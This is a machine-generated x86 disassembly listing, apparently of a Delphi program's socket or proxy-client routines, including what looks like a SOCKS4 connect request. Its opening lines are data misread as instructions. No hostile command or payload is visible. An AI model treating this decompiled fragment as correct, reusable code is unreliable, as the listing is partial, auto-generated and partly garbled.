pop ebx
inc edi
add [ eax + eax ] cl
add [ eax ] al
and al 0x5a
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
outsd
jb r-xdata
outsb
je r-xdata
add [ 0x65696c43 ] cl
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
dec eax
add [ ebx - 0x74307500 ] cl
salc
call sub_472cb0
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
add [ eax ] al
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x13004032 ] ah
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
sar [ eax ] 0x5b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
jb r-xdata
inc ebp
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
mov dl 0x1
mov eax ebx
call sub_476148
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5a ] dh
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ eax ] al
[ eax ]
sub_475bb4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_472cb0
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_476148
sub_475bf0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x1
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_475c24
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_476100
mov eax ebx
call sub_476124
sub_475c5c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41933c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_475c8c
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_475cb0
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_475cd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472c5c
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_475d14
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_475d40
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_475e54
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_476178
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475e5b
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040d0
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_4761cc
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
jmp r-xdata
sub_475e60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_404100
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_475e7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472c5c
pop esi
pop ebx
retn
sub_475ea4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_476148
lea eax [ edi + 0x1c ]
push eax
lea ecx [ edi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov esi eax
push 0x1
mov [ esp + 0x4 ] 0x2714
mov [ esp + 0x8 ] 0x2736
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_472c68
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] 0x1
mov eax edi
call sub_476100
mov eax edi
call sub_476124
sub_475f18
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_419304
mov dl 0x1
mov eax edi
call sub_476148
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_475f70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4760a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_475160
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_476084
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418854
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_47511c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_475f70
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_475f70
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4760a8
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_4760b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4031f8
mov edi eax
mov eax esi
call sub_4031f8
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_404100
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_404100
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_418fac
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_476100
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_476124
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_476148
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_4040ac
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_4040ac
xor eax eax
mov [ ebx + 0x1c ] eax
sub_476178
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472c68
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_476100
sub_4761cc
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_476178
test al al
je r-xdata
sub_4761fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx ecx
mov esi edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_476271
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418854
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_47511c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476278
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
sub_4762a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419a68
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4762f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476319
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476320
retn
sub_47662c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_476650
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47668c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_41ae88
sub_4766bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_41ae88
sub_4766ec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_476760
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476785
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47678c
retn
sub_476888
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47556c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_4768bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4768e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4768e8
retn
sub_476b2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419304
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x10 ] eax
mov eax esi
call sub_476b10
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_476b78
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41933c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_476ba8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476ced
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4040ac
cmp [ ebx + 0xc ] 0x0
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_4040ac
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476cf4
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_4040d0
retn
mov edx esi
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ esi ]
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0xc ]
call sub_408288
push [ ebp - 0x1c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_40442c
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
push [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0xc ]
call sub_408288
push [ ebp - 0x14 ]
push r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40442c
push [ esi ]
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
call sub_408288
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x10 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40442c
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax [ ebp - 0x4 ]
jle r-xdata
jmp r-xdata
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_476d20
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_476e1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_476b10
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476e22
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_4040d0
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_4045cc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408120
mov eax [ ebp - 0xc ]
call sub_40436c
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_476ec8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4046f8
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_4045cc
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_476e2c
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
xor eax eax
pop ebx
retn
sub_476e4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476e97
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476e9e
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408288
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_404100
sub_476ec8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_404100
mov eax esi
call sub_40436c
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_408400
mov [ ebx + 0xc ] eax
sub_476ef4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419a68
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_476f30
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_476f78
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_476f78
cmp ebp [ eax + 0xc ]
jne r-xdata
sub_476f8c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov esi eax
test esi esi
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_476fbc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476fe1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476fe8
retn
sub_4772a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4754d4
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4772ec
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4774f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_472da8
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_473360
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_473360
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_40436c
push eax
mov eax edi
call sub_40456c
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028e8
mov eax edi
call sub_40436c
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_404348
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4774fc
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_4040d0
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
